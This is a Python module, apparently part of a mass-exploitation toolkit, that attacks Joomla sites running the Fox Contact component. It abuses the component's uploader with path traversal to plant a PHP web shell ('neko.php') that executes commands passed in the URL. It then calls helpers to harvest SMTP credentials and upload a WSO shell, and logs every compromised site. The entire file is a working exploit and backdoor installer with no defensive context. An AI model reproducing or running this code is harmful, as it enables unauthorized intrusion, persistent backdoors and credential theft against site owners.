# coding=utf-8
import requests, re
import printModule
import getSMTP
import wsoShellUploaderModule

payloadshell = '"neko!!<?php {});?>"'.format("system({}".format('$_GET["cmd"]'))
Headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'
}

def Exploit(site):
    try:
        Checker = requests.get('http://' + site + "/components/com_foxcontact/foxcontact.php", timeout=10, headers=Headers)
        if 'Restricted access' in str(Checker.content):
            GotCid = requests.get('http://' + site + '/index.php?option=com_foxcontact&amp;view=invalid',
                                  timeout=10, headers=Headers)
            cids = re.findall('foxcontact&amp;Itemid=(.*?)" >', str(GotCid.content))
            flag = 0
            for cid in cids:
                cid = str(cid)
                URLS = ["/components/com_foxcontact/lib/file-uploader.php?cid={}&mid={}&qqfile=/../../{}".format(
                    cid, cid, 'neko.php'),
                            "/index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id={}"
                            "?cid={}&mid={}&qqfile=/../../{}".format(
                                cid, cid, cid, 'neko.php'),
                            "/index.php?option=com_foxcontact&amp;view=loader&amp;type=uploader&amp;"
                            "owner=module&amp;id={}&cid={}&mid={}&owner=module&id={}&qqfile=/../../{}".format(
                                cid, cid, cid, cid, 'neko.php'),
                            "/components/com_foxcontact/lib/uploader.php?cid={}&mid={}&qqfile=/../../{}".format(
                                cid, cid,'neko.php')]
                for path in URLS:
                    Exp = site + path
                    requests.post('http://' + Exp, data=payloadshell, timeout=10, headers=Headers)
                    SH = requests.get('http://' + site + '/components/com_foxcontact/neko.php', timeout=10, headers=Headers)
                    if 'neko!!' in str(SH.content):
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(site + '/components/com_foxcontact/neko.php?cmd=uname -a' + '\n')
                        getSMTP.JooomlaSMTPshell(site + '/components/com_foxcontact/neko.php?cmd=id')
                        WSo = wsoShellUploaderModule.UploadWso(site + '/components/com_foxcontact/neko.php?cmd=id')
                        if WSo == 'No':
                            pass
                        else:
                            with open('result/WSo_Shell.txt', 'a') as Wr:
                                Wr.write('{}\n'.format(WSo))
                        flag = 1
                        break
                    else:
                       pass
            if flag == 0:
                return printModule.returnNo(site, 'N/A', 'Com_FoxContact', 'Joomla')
            else:
                return printModule.returnYes(site, 'N/A', 'Com_FoxContact', 'Joomla')
        else:
            return printModule.returnNo(site, 'N/A', 'Com_FoxContact', 'Joomla')
    except:
        return printModule.returnNo(site, 'N/A', 'Com_FoxContact', 'Joomla')
